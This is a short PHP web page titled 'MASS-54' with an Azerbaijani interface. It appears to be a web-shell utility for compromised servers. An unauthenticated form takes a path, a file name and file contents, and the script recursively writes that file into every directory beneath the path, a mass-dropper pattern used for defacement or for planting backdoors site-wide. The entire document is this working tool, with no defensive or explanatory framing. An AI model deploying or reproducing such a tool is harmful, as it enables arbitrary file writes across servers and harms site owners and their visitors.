<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MASS-54</title>
</head>
<body>
    <h1>MASS-54</h1>
    <form method="post" action="">
        <label for="directory">Yolu ver (PATH):</label>
        <input type="text" id="directory" name="directory" required><br><br>

        <label for="filename">Fayl adı:</label>
        <input type="text" id="filename" name="filename" required><br><br>

        <label for="content">Fayl məzmunu:</label><br>
        <textarea id="content" name="content" rows="4" cols="50" required></textarea><br><br>

        <input type="submit" value="Başla...">
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $baseDir = $_POST['directory'];
        $fileName = $_POST['filename'];
        $fileContent = $_POST['content'];

        function addFileToAllDirectories($baseDir, $fileName, $fileContent) {
            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDir), RecursiveIteratorIterator::SELF_FIRST);

            foreach ($iterator as $fileInfo) {
                if ($fileInfo->isDir()) {
                    $dirPath = $fileInfo->getRealPath();
                    $filePath = $dirPath . DIRECTORY_SEPARATOR . $fileName;

                    file_put_contents($filePath, $fileContent);
                    echo "Fayl əlavə edildi: " . $filePath . "<br>";
                }
            }
        }

        addFileToAllDirectories($baseDir, $fileName, $fileContent);
    }
    ?>
</body>
</html>
